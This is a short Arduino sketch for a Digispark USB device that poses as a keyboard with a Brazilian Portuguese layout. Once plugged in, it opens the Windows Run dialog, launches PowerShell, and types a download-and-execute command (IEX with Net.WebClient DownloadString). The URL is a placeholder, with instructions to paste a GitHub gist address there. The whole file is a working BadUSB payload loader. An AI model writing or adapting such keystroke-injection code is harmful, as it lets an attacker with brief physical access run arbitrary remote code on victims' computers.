#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.println("powershell");
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('Colar a url do arquivo criada no gist github ');\"");
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  for (;;) {}
}
